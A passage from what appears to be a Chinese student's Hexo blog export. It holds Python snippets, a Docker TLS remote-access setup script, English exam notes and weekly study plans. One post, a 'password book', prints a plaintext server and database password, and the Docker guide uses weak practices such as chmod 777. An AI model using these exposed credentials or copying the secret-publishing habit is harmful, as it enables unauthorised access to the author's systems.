<h3 id="合并字典"><a href="#合并字典" class="headerlink" title="合并字典"></a>合并字典</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">first_dictionary = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Fan&#x27;</span>, <span class="string">&#x27;location&#x27;</span>: <span class="string">&#x27;Guangzhou&#x27;</span>&#125;</span><br><span class="line">second_dictionary = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Fan&#x27;</span>, <span class="string">&#x27;surname&#x27;</span>: <span class="string">&#x27;Xiao&#x27;</span>, <span class="string">&#x27;location&#x27;</span>: <span class="string">&#x27;Guangdong, Guangzhou&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">result = first_dictionary | second_dictionary</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dictionary_one = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>, <span class="string">&quot;b&quot;</span>: <span class="number">2</span>&#125;</span><br><span class="line">dictionary_two = &#123;<span class="string">&quot;c&quot;</span>: <span class="number">3</span>, <span class="string">&quot;d&quot;</span>: <span class="number">4</span>&#125;</span><br><span class="line"></span><br><span class="line">merged = &#123;**dictionary_one, **dictionary_two&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(merged)  <span class="comment"># &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;c&#x27;: 3, &#x27;d&#x27;: 4&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="计算函数运行的时间"><a href="#计算函数运行的时间" class="headerlink" title="计算函数运行的时间"></a>计算函数运行的时间</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 计算函数运行的时间</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">func: <span class="built_in">callable</span></span>) -&gt; <span class="literal">None</span>: <span class="comment"># callable表示能够被调用的函数</span></span><br><span class="line">    start_time = time.time()  <span class="comment"># 程序开始时间</span></span><br><span class="line">    func() <span class="comment"># function()   运行的程序</span></span><br><span class="line">    end_time = time.time()  <span class="comment"># 程序结束时间</span></span><br><span class="line">    run_time = end_time - start_time  <span class="comment"># 程序的运行时间，单位为秒</span></span><br><span class="line">    <span class="built_in">print</span>(run_time)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术博客</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>快速配置ca证书远程访问docker</title>
    <url>/2023/11/04/%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2/%E9%85%8D%E7%BD%AEca%E8%AF%81%E4%B9%A6%E8%BF%9C%E7%A8%8B%E8%AE%BF%E9%97%AEdocker/</url>
    <content><![CDATA[<h1 id="快速配置ca证书远程访问docker"><a href="#快速配置ca证书远程访问docker" class="headerlink" title="快速配置ca证书远程访问docker"></a>快速配置ca证书远程访问docker</h1><h2 id="一键创建证书脚本"><a href="#一键创建证书脚本" class="headerlink" title="一键创建证书脚本"></a>一键创建证书脚本</h2><h4 id="docker-ca-shell-sh"><a href="#docker-ca-shell-sh" class="headerlink" title="docker-ca-shell.sh"></a><strong>docker-ca-shell.sh</strong></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">ip=你的IP</span><br><span class="line">password=你的密码</span><br><span class="line">dir=/root/docker/cert # 证书生成位置</span><br><span class="line">validity_period=10    # 证书有效期10年</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将此shell脚本在安装docker的机器上执行，作用是生成docker远程连接加密证书</span></span><br><span class="line">if [ ! -d &quot;$dir&quot; ]; then</span><br><span class="line">  echo &quot;&quot;</span><br><span class="line">  echo &quot;$dir , not dir , will create&quot;</span><br><span class="line">  echo &quot;&quot;</span><br><span class="line">  mkdir -p $dir</span><br><span class="line">else</span><br><span class="line">  echo &quot;&quot;</span><br><span class="line">  echo &quot;$dir , dir exist , will delete and create&quot;</span><br><span class="line">  echo &quot;&quot;</span><br><span class="line">  rm -rf $dir</span><br><span class="line">  mkdir -p $dir</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">cd $dir || exit</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建根证书RSA私钥</span></span><br><span class="line">openssl genrsa -aes256 -passout pass:&quot;$password&quot; -out ca-key.pem 4096</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建CA证书</span></span><br><span class="line">openssl req -new -x509 -days $validity_period -key ca-key.pem -passin pass:&quot;$password&quot; -sha256 -out ca.pem -subj &quot;/C=NL/ST=./L=./O=./CN=$ip&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建服务端私钥</span></span><br><span class="line">openssl genrsa -out server-key.pem 4096</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建服务端签名请求证书文件</span></span><br><span class="line">openssl req -subj &quot;/CN=$ip&quot; -sha256 -new -key server-key.pem -out server.csr</span><br><span class="line"></span><br><span class="line">echo subjectAltName = IP:$ip,IP:0.0.0.0 &gt;&gt;extfile.cnf</span><br><span class="line"></span><br><span class="line">echo extendedKeyUsage = serverAuth &gt;&gt;extfile.cnf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建签名生效的服务端证书文件</span></span><br><span class="line">openssl x509 -req -days $validity_period -sha256 -in server.csr -CA ca.pem -CAkey ca-key.pem -passin &quot;pass:$password&quot; -CAcreateserial -out server-cert.pem -extfile extfile.cnf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建客户端私钥</span></span><br><span class="line">openssl genrsa -out key.pem 4096</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建客户端签名请求证书文件</span></span><br><span class="line">openssl req -subj &#x27;/CN=client&#x27; -new -key key.pem -out client.csr</span><br><span class="line"></span><br><span class="line">echo extendedKeyUsage = clientAuth &gt;&gt;extfile.cnf</span><br><span class="line"></span><br><span class="line">echo extendedKeyUsage = clientAuth &gt;extfile-client.cnf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建签名生效的客户端证书文件</span></span><br><span class="line">openssl x509 -req -days $validity_period -sha256 -in client.csr -CA ca.pem -CAkey ca-key.pem -passin &quot;pass:$password&quot; -CAcreateserial -out cert.pem -extfile extfile-client.cnf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除多余文件</span></span><br><span class="line">rm -f -v client.csr server.csr extfile.cnf extfile-client.cnf</span><br><span class="line"></span><br><span class="line">chmod -v 0400 ca-key.pem key.pem server-key.pem</span><br><span class="line"></span><br><span class="line">chmod -v 0444 ca.pem server-cert.pem cert.pem</span><br></pre></td></tr></table></figure>

<h4 id="给予权限"><a href="#给予权限" class="headerlink" title="给予权限"></a>给予权限</h4><p>运行前请给脚本文件<code>777</code>权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 777 docker-ca-shell.sh</span><br></pre></td></tr></table></figure>

<h4 id="编辑docker-service配置文件"><a href="#编辑docker-service配置文件" class="headerlink" title="编辑docker.service配置文件"></a>编辑docker.service配置文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/docker.service</span><br></pre></td></tr></table></figure>

<p>找到<code>ExecStart</code> &#x3D; 开头的一行代码，将其替换为如下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[Service]</span><br><span class="line">ExecStart=</span><br><span class="line">ExecStart=/usr/bin/dockerd --tlsverify --tlscacert=/证书地址/ca.pem --tlscert=/证书地址/server-cert.pem --tlskey=/证书地址/server-key.pem -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock</span><br></pre></td></tr></table></figure>

<h4 id="刷新Docker"><a href="#刷新Docker" class="headerlink" title="刷新Docker"></a>刷新Docker</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload &amp;&amp; systemctl restart docker</span><br></pre></td></tr></table></figure>

<h2 id="测试连接方法"><a href="#测试连接方法" class="headerlink" title="测试连接方法"></a>测试连接方法</h2><h4 id="服务器本机测试-先CD进入证书文件夹-："><a href="#服务器本机测试-先CD进入证书文件夹-：" class="headerlink" title="服务器本机测试(先CD进入证书文件夹)："></a>服务器本机测试(先<code>CD</code>进入证书文件夹)：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H tcp://你的ip:2375 version</span><br></pre></td></tr></table></figure>

<p>如果能看到下面格式的内容，即为成功：</p>
<p><img src="https://s2.loli.net/2023/11/04/5xRfEAiU7yL3zn1.png" alt="服务器本机测试成功图片"></p>
<h4 id="个人终端测试-先CD进入证书文件夹-："><a href="#个人终端测试-先CD进入证书文件夹-：" class="headerlink" title="个人终端测试(先CD进入证书文件夹)："></a>个人终端测试(先<code>CD</code>进入证书文件夹)：</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl https://你的ip:2375/info --cert cert.pem --key key.pem --cacert ca.pem</span><br></pre></td></tr></table></figure>

<blockquote>
<p>测试前要先将服务器的密钥复制到个人终端上</p>
</blockquote>
<p>如果返回一段json格式的数据，即为成功：</p>
<p><img src="https://s2.loli.net/2023/11/04/pGKnP4hlbzEmvBL.png" alt="个人终端测试成功图片"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1]: <a href="https://blog.csdn.net/qq_60750453/article/details/128730618">https://blog.csdn.net/qq_60750453/article/details/128730618</a>	“Linux开启Docker远程访问并设置安全访问(证书密钥)，附一份小白一键设置脚本哦！”</p>
]]></content>
      <categories>
        <category>技术博客</category>
      </categories>
      <tags>
        <tag>ca证书</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/30/%E7%BC%96%E7%A8%8B%E6%8A%80%E8%83%BD/Hexo%E5%8D%9A%E5%AE%A2%E5%88%B6%E4%BD%9C/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/29/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/%E3%80%8A%E5%A4%A7%E8%AF%9D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="《大话设计模式》阅读笔记"><a href="#《大话设计模式》阅读笔记" class="headerlink" title="《大话设计模式》阅读笔记"></a>《大话设计模式》阅读笔记</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="前置语法"><a href="#前置语法" class="headerlink" title="前置语法"></a>前置语法</h2><h3 id="面向对象概念"><a href="#面向对象概念" class="headerlink" title="面向对象概念"></a>面向对象概念</h3><p>对象是一个自包含的实体，用一组可识别的特性和行为来标识 。对象是一个自包含的实体，用一组可识别的特性和行为来标识 。对象是一个自包含的实体，用一组可识别的特性和行为来标识 。</p>
<p>“实例，就是一个真实的对象 。比如我们都是‘人’，而你和我其实就是‘人’类的实例了。而实例化就是创建对象的过程，使用new关键字来创建 。”</p>
<h2 id="UML图"><a href="#UML图" class="headerlink" title="UML图"></a>UML图</h2><h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><h3 id="1-简单工厂模式"><a href="#1-简单工厂模式" class="headerlink" title="1. 简单工厂模式"></a>1. 简单工厂模式</h3>]]></content>
  </entry>
  <entry>
    <title>植物大战僵尸改版制作笔记</title>
    <url>/2023/10/28/%E9%A1%B9%E7%9B%AE/PVZ/</url>
    <content><![CDATA[<h1 id="植物大战僵尸改版制作笔记"><a href="#植物大战僵尸改版制作笔记" class="headerlink" title="植物大战僵尸改版制作笔记"></a>植物大战僵尸改版制作笔记</h1><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p>[1]: <a href="https://www.bilibili.com/video/BV1CC4y1g7YU?vd_source=a5588eef7796fbd7cd29a713abd6a434">https://www.bilibili.com/video/BV1CC4y1g7YU?vd_source=a5588eef7796fbd7cd29a713abd6a434</a>	“【pvz改版下载推荐（pvz改版知识科普）（重投）】”<br>[2]: <a href="http://lonelystar.org/download.htm#google_vignette">http://lonelystar.org/download.htm#google_vignette</a><br>[3]: <a href="https://tieba.baidu.com/f?ie=utf-8&amp;kw=pvz&amp;fr=search">https://tieba.baidu.com/f?ie=utf-8&amp;kw=pvz&amp;fr=search</a>	“百度贴吧”<br>[4]: <a href="https://github.com/search?q=pvz%E6%94%B9%E7%89%88&amp;type=repositories">https://github.com/search?q=pvz%E6%94%B9%E7%89%88&amp;type=repositories</a>	“github搜索”<br>[5]: <a href="https://www.zhihu.com/question/378699098">https://www.zhihu.com/question/378699098</a>	“知乎”</p>
]]></content>
      <tags>
        <tag>PVZ</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/22/%E8%8B%B1%E8%AF%AD/%E8%8B%B1%E8%AF%AD%E5%9B%9B%E7%BA%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="四级学习笔记"><a href="#四级学习笔记" class="headerlink" title="四级学习笔记"></a>四级学习笔记</h1><h2 id="听力"><a href="#听力" class="headerlink" title="听力"></a>听力</h2><h3 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h3><p><img src="https://s2.loli.net/2023/10/30/PjitMIQWv5gdc3F.png" alt="image.png"></p>
<h3 id="总的技巧"><a href="#总的技巧" class="headerlink" title="总的技巧"></a>总的技巧</h3><h4 id="1-视听一致"><a href="#1-视听一致" class="headerlink" title="1. 视听一致"></a>1. 视听一致</h4><p>视：即看到的选项<br>听：即听到的录音<br>四个选项中完整被读到的选项或者吻合度最高的选项为正确选项。</p>
<h4 id="2-同义替换"><a href="#2-同义替换" class="headerlink" title="2. 同义替换"></a>2. 同义替换</h4><table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>replace</td>
<td>instead of</td>
<td>替代</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<ol>
<li><p>关键词</p>
</li>
<li><p>定位题目</p>
<ol>
<li>听到下一题选项的关键词，要切换答案了</li>
</ol>
</li>
</ol>
<h4 id="看选项"><a href="#看选项" class="headerlink" title="看选项"></a>看选项</h4><p>1.看相同与不同<br>a.竖读选项，看相同点：确定定位词<br>b.横读选项，看不同点：确定出题点（名词，形容词，独特动<br>词，否定，数字)总原则：划的几个词代表选项大体含义。</p>
<h3 id="如何训练"><a href="#如何训练" class="headerlink" title="如何训练"></a>如何训练</h3><ol>
<li><p>完整做题（按照考试的要求）→强化做题技巧。</p>
</li>
<li><p>先不要对答案，允许自己听多次，看自己能不能听出正确答案</p>
</li>
<li><p>对答案，翻看录音原文进行查阅（生词+语音现象）→ 解决词汇量问题</p>
</li>
<li><p>对比正确选项和错误选项，标记关键句子，思考下次该如何做对</p>
</li>
<li><p>跟读模仿→改善发音，熟悉语音现象，适应听力语速。</p>
<p>a.句句跟读 b.跟读7遍 c.加快语速读</p>
</li>
<li><p>不看原文听懂→验证环节。</p>
</li>
</ol>
<h3 id="新闻"><a href="#新闻" class="headerlink" title="新闻"></a>新闻</h3><ol>
<li>新闻第一句 $80%$ 出第一小问的答案</li>
<li>转折词后面容易出答案</li>
<li>如果只有两道题，两道题的正确选项不太可能是一样的</li>
</ol>
<h3 id="短对话"><a href="#短对话" class="headerlink" title="短对话"></a>短对话</h3><h3 id="短文"><a href="#短文" class="headerlink" title="短文"></a>短文</h3><p><img src="https://s2.loli.net/2023/10/22/r4qYxeyS6Dm3pTg.png" alt="image-20231022160013523"></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/17/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E5%AF%86%E7%A0%81%E6%9C%AC/</url>
    <content><![CDATA[<h1 id="密码本"><a href="#密码本" class="headerlink" title="密码本"></a>密码本</h1><h2 id="密码转换"><a href="#密码转换" class="headerlink" title="密码转换"></a>密码转换</h2><table>
<thead>
<tr>
<th align="center">源码</th>
<th align="center">转换</th>
<th align="center"></th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center">a</td>
<td align="center">@</td>
<td align="center">u</td>
<td align="center">u</td>
</tr>
<tr>
<td align="center">b</td>
<td align="center">6</td>
<td align="center">v</td>
<td align="center">/</td>
</tr>
<tr>
<td align="center">c</td>
<td align="center">(</td>
<td align="center">w</td>
<td align="center">vv</td>
</tr>
<tr>
<td align="center">d</td>
<td align="center">|)</td>
<td align="center">x</td>
<td align="center">*</td>
</tr>
<tr>
<td align="center">e</td>
<td align="center">3</td>
<td align="center">y</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">f</td>
<td align="center">5</td>
<td align="center">z</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">g</td>
<td align="center">9</td>
<td align="center">1</td>
<td align="center">l</td>
</tr>
<tr>
<td align="center">h</td>
<td align="center">|~</td>
<td align="center">2</td>
<td align="center">z</td>
</tr>
<tr>
<td align="center">i</td>
<td align="center">!</td>
<td align="center">3</td>
<td align="center">e</td>
</tr>
<tr>
<td align="center">j</td>
<td align="center">?</td>
<td align="center">4</td>
<td align="center">#</td>
</tr>
<tr>
<td align="center">k</td>
<td align="center">|&lt;</td>
<td align="center">5</td>
<td align="center">f</td>
</tr>
<tr>
<td align="center">l</td>
<td align="center">1</td>
<td align="center">6</td>
<td align="center">b</td>
</tr>
<tr>
<td align="center">m</td>
<td align="center">nn</td>
<td align="center">7</td>
<td align="center">y</td>
</tr>
<tr>
<td align="center">n</td>
<td align="center">^</td>
<td align="center">8</td>
<td align="center">&amp;</td>
</tr>
<tr>
<td align="center">o</td>
<td align="center">0</td>
<td align="center">9</td>
<td align="center">g</td>
</tr>
<tr>
<td align="center">p</td>
<td align="center">p</td>
<td align="center">0</td>
<td align="center">o</td>
</tr>
<tr>
<td align="center">r</td>
<td align="center">%</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">s</td>
<td align="center">$</td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">t</td>
<td align="center">+</td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<h2 id="软件开发密码管理"><a href="#软件开发密码管理" class="headerlink" title="软件开发密码管理"></a>软件开发密码管理</h2><h3 id="服务器密码"><a href="#服务器密码" class="headerlink" title="服务器密码"></a>服务器密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Jiang123456</span><br></pre></td></tr></table></figure>

<h3 id="数据库密码"><a href="#数据库密码" class="headerlink" title="数据库密码"></a>数据库密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 原码</span><br><span class="line">Jiang123456</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>2023-10月第三周学习计划</title>
    <url>/2023/10/15/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023/2023-10/2023-10-3rd-WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-10第三周学习计划"><a href="#2023-10第三周学习计划" class="headerlink" title="2023-10第三周学习计划"></a>2023-10第三周学习计划</h1><p>本文主要规划的是 <code>10-16</code> 到 <code>10-22</code> 的学习计划</p>
<h2 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h2><ol>
<li>大项目开发</li>
<li>英语四级复习中</li>
</ol>
<h2 id="具体规划"><a href="#具体规划" class="headerlink" title="具体规划"></a>具体规划</h2><h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li><h6 id="有时间重新写一个可以复用的遗传算法代码"><a href="#有时间重新写一个可以复用的遗传算法代码" class="headerlink" title="有时间重新写一个可以复用的遗传算法代码"></a>有时间重新写一个可以复用的遗传算法代码</h6></li>
<li><p>准备找wy</p>
</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li><p>计算机组成原理刷完</p>
</li>
<li><p>看一下龙芯是否可以实现</p>
</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li><p>准备英语四级的备考</p>
</li>
<li></li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>开始大项目</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>回复正常作息</li>
<li>这个学期的指标是要看至少20部经典电影</li>
<li>如何养成看书的习惯</li>
</ol>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（8-00-12-00）"><a href="#上午（8-00-12-00）" class="headerlink" title="上午（8:00-12:00）"></a>上午（8:00-12:00）</h3><ol>
<li>早餐</li>
<li>厕所</li>
<li>冥想</li>
<li>阅读</li>
<li>写作</li>
<li>总结</li>
<li>规划</li>
<li>算法题</li>
</ol>
<h3 id="中午（12-30-14-30）"><a href="#中午（12-30-14-30）" class="headerlink" title="中午（12:30-14:30）"></a>中午（12:30-14:30）</h3><ol>
<li>英语网课</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>专业课</li>
</ol>
<h3 id="晚上（19-00-23-00）"><a href="#晚上（19-00-23-00）" class="headerlink" title="晚上（19:00-23:00）"></a>晚上（19:00-23:00）</h3><ol>
<li><p>看书 &amp; 学习其他内容的课程（1h），尽量减少饭后带来对学习的困倦感。</p>
</li>
<li><p>项目</p>
</li>
</ol>
<h3 id="深夜（23-30-7-30）"><a href="#深夜（23-30-7-30）" class="headerlink" title="深夜（23:30-7:30）"></a>深夜（23:30-7:30）</h3><ol>
<li>睡觉</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
      <tags>
        <tag>2023</tag>
        <tag>10月</tag>
      </tags>
  </entry>
  <entry>
    <title>2023-10月第一周学习计划</title>
    <url>/2023/10/10/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023/2023-10/2023-10-2nd-WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-9第三周学习计划"><a href="#2023-9第三周学习计划" class="headerlink" title="2023-9第三周学习计划"></a>2023-9第三周学习计划</h1><p>本文主要规划的是 <code>10-9</code> 到 <code>10-15</code> 的学习计划</p>
<h2 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h2><ol>
<li>计算机组成原理刷完</li>
<li>英语四级复习中</li>
</ol>
<h2 id="具体规划"><a href="#具体规划" class="headerlink" title="具体规划"></a>具体规划</h2><h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>有时间重新写一个可以复用的遗传算法代码</li>
<li>准备找wy</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li><p>计算机组成原理刷完</p>
</li>
<li><p>看一下龙芯是否可以实现</p>
</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li><p>准备英语四级的备考</p>
</li>
<li></li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>开始准备大项目</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>要总结一下每日必做的内容</li>
<li>这个学期的指标是要看至少20部经典电影</li>
<li>如何养成看书的习惯</li>
</ol>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（8-00-12-00）"><a href="#上午（8-00-12-00）" class="headerlink" title="上午（8:00-12:00）"></a>上午（8:00-12:00）</h3><ol>
<li>早餐</li>
<li>厕所</li>
<li>冥想</li>
<li>阅读</li>
<li>写作</li>
<li>总结</li>
<li>规划</li>
</ol>
<h3 id="中午（12-30-14-30）"><a href="#中午（12-30-14-30）" class="headerlink" title="中午（12:30-14:30）"></a>中午（12:30-14:30）</h3><ol>
<li>英语网课</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>专业课</li>
</ol>
<h3 id="晚上（19-00-23-00）"><a href="#晚上（19-00-23-00）" class="headerlink" title="晚上（19:00-23:00）"></a>晚上（19:00-23:00）</h3><ol>
<li><p>看书 &amp; 学习其他内容的课程（1h），尽量减少饭后带来对学习的困倦感。</p>
</li>
<li><p>项目</p>
</li>
</ol>
<h3 id="深夜（23-30-7-30）"><a href="#深夜（23-30-7-30）" class="headerlink" title="深夜（23:30-7:30）"></a>深夜（23:30-7:30）</h3><ol>
<li>睡觉</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
      <tags>
        <tag>2023</tag>
        <tag>10月</tag>
      </tags>
  </entry>
  <entry>
    <title>2023-9月第三周学习计划</title>
    <url>/2023/09/24/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023/2023-10/2023-10-1st-WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-9第三周学习计划"><a href="#2023-9第三周学习计划" class="headerlink" title="2023-9第三周学习计划"></a>2023-9第三周学习计划</h1><p>本文主要规划的是 <code>10-2</code> 到 <code>10-8</code> 的学习计划</p>
<h2 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h2><ol>
<li>计算机组成原理</li>
<li>英语的学习</li>
</ol>
<h2 id="具体规划"><a href="#具体规划" class="headerlink" title="具体规划"></a>具体规划</h2><h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>有时间重新写一个可以复用的遗传算法代码</li>
<li></li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>机组完成一半</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li><p>准备英语四级的备考</p>
</li>
<li></li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li><p>完成汇编实验</p>
</li>
<li><p>开始准备大项目</p>
</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>要总结一下每日必做的内容</li>
<li>这个学期的指标是要看至少20部经典电影</li>
<li>如何养成看书的习惯</li>
</ol>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（8-00-12-00）"><a href="#上午（8-00-12-00）" class="headerlink" title="上午（8:00-12:00）"></a>上午（8:00-12:00）</h3><ol>
<li>早餐</li>
<li>厕所</li>
<li>冥想</li>
<li>阅读</li>
<li>写作</li>
<li>总结</li>
<li>规划</li>
</ol>
<h3 id="中午（12-30-14-30）"><a href="#中午（12-30-14-30）" class="headerlink" title="中午（12:30-14:30）"></a>中午（12:30-14:30）</h3><ol>
<li>英语网课</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>专业课</li>
</ol>
<h3 id="晚上（19-00-23-00）"><a href="#晚上（19-00-23-00）" class="headerlink" title="晚上（19:00-23:00）"></a>晚上（19:00-23:00）</h3><ol>
<li><p>看书 &amp; 学习其他内容的课程（1h），尽量减少饭后带来对学习的困倦感。</p>
</li>
<li><p>项目</p>
</li>
</ol>
<h3 id="深夜（23-30-7-30）"><a href="#深夜（23-30-7-30）" class="headerlink" title="深夜（23:30-7:30）"></a>深夜（23:30-7:30）</h3><ol>
<li>睡觉</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
      <tags>
        <tag>2023</tag>
        <tag>9月</tag>
      </tags>
  </entry>
  <entry>
    <title>2023-9月第三周学习计划</title>
    <url>/2023/09/24/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023/2023-9/2023-9-4st-WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-9第三周学习计划"><a href="#2023-9第三周学习计划" class="headerlink" title="2023-9第三周学习计划"></a>2023-9第三周学习计划</h1><p>本文主要规划的是 <code>9-25</code> 到 <code>10-1</code> 的学习计划</p>
<h2 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h2><ol>
<li>操作系统</li>
<li>英语的学习</li>
</ol>
<h2 id="具体规划"><a href="#具体规划" class="headerlink" title="具体规划"></a>具体规划</h2><h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>有时间重新写一个可以复用的遗传算法代码</li>
<li></li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>操作系统应该可以学完，完成刷题</li>
<li>开始预习计算机组成原理</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li><p>准备英语四级的备考</p>
</li>
<li></li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol start="2">
<li>完成汇编实验</li>
<li></li>
